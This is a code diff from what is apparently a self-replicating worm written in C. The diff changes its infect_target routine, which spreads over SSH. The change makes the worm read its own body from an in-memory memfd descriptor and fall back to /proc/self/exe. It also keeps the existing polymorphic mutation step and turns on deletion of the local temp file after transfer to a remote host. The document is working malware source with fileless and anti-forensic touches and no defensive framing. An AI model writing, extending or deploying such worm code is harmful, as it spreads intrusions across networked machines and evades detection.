@@ -600,49 +600,100 @@ int infect_target(const char* ip, const char* argv0) {
     printf("[*] Attempting infection on %s via SSH...\n", ip);
     
     // 1. Read own binary -> Self-replication
-    char* exe_path = get_executable_path(argv0);
-    if (!exe_path) {
-        printf("[-] Could not determine executable path, trying /proc/self/exe\n");
-        exe_path = strdup("/proc/self/exe");
+    // Try to read from memfd file descriptor first (if passed via environment)
+    unsigned char* worm_content = NULL;
+    size_t file_size = 0;
+    int fd = -1;
+    
+    // Check if memfd fd was passed via environment variable
+    char* fd_str = getenv("MEMFD_FD");
+    if (fd_str) {
+        fd = atoi(fd_str);
+        printf("[*] Reading from memfd file descriptor: %d\n", fd);
+        
+        // Verify fd is valid
+        if (fcntl(fd, F_GETFD) == -1) {
+            printf("[-] Invalid file descriptor: %d\n", fd);
+            fd = -1;
+        } else {
+            // Get file size using lseek
+            off_t size = lseek(fd, 0, SEEK_END);
+            if (size < 0) {
+                printf("[-] Error getting file size from fd: %s\n", strerror(errno));
+                fd = -1;
+            } else {
+                file_size = (size_t)size;
+                lseek(fd, 0, SEEK_SET);  // Reset to beginning
+                
+                // Read from file descriptor
+                worm_content = malloc(file_size);
+                if (!worm_content) {
+                    printf("[-] Memory allocation failed\n");
+                    fd = -1;
+                } else {
+                    ssize_t bytes_read = read(fd, worm_content, file_size);
+                    if (bytes_read < 0 || (size_t)bytes_read != file_size) {
+                        printf("[-] Error reading from fd: %s\n", strerror(errno));
+                        free(worm_content);
+                        worm_content = NULL;
+                        fd = -1;
+                    } else {
+                        printf("[+] Successfully read %zu bytes from memfd\n", file_size);
+                    }
+                }
+            }
+        }
     }
     
-    FILE* f = fopen(exe_path, "rb");
-    if (!f) {
-        printf("[-] Error reading own binary: %s\n", strerror(errno));
-        free(exe_path);
-        return 0;
-    }
-    
-    // Get file size
-    fseek(f, 0, SEEK_END);
-    long file_size_long = ftell(f);
-    fseek(f, 0, SEEK_SET);
-
-    if (file_size_long < 0) {
-        printf("[-] Error getting file size\n");
-        fclose(f);
-        free(exe_path);
-        return 0;
-    }
-    
-    size_t file_size = (size_t)file_size_long;
-    
-    // Read file
-    unsigned char* worm_content = malloc(file_size);
+    // Fallback: Read from /proc/self/exe (for temp file or normal execution)
     if (!worm_content) {
+        printf("[*] Falling back to reading from /proc/self/exe\n");
+        char* exe_path = get_executable_path(argv0);
+        if (!exe_path) {
+            printf("[-] Could not determine executable path, trying /proc/self/exe\n");
+            exe_path = strdup("/proc/self/exe");
+        }
+        
+        FILE* f = fopen(exe_path, "rb");
+        if (!f) {
+            printf("[-] Error reading own binary: %s\n", strerror(errno));
+            free(exe_path);
+            return 0;
+        }
+        
+        // Get file size
+        fseek(f, 0, SEEK_END);
+        long file_size_long = ftell(f);
+        fseek(f, 0, SEEK_SET);
+        
+        if (file_size_long < 0) {
+            printf("[-] Error getting file size\n");
+            fclose(f);
+            free(exe_path);
+            return 0;
+        }
+        
+        file_size = (size_t)file_size_long;
+        
+        // Read file
+        worm_content = malloc(file_size);
+        if (!worm_content) {
+            fclose(f);
+            free(exe_path);
+            return 0;
+        }
+        
+        size_t bytes_read = fread(worm_content, 1, file_size, f);
         fclose(f);
         free(exe_path);
-        return 0;
-    }
-    
-    size_t bytes_read = fread(worm_content, 1, file_size, f);
-    fclose(f);
-    free(exe_path);
-    
-    if (bytes_read != file_size) {
-        printf("[-] Error reading binary: incomplete read\n");
-        free(worm_content);
-        return 0;
+        
+        if (bytes_read != file_size) {
+            printf("[-] Error reading binary: incomplete read\n");
+            free(worm_content);
+            return 0;
+        }
+        
+        printf("[+] Successfully read %zu bytes from file\n", file_size);
     }
     
     // Apply polymorphic mutation to create unique variant
@@ -713,8 +764,8 @@ int infect_target(const char* ip, const char* argv0) {
         return 0;
     }
     
-    // Clean up local temp file
-    //unlink(temp_worm);
+    // Clean up local temp file (after successful transfer)
+    unlink(temp_worm);
     
     // 4. Make executable on remote
     printf("[*] Setting executable permissions on remote...\n");
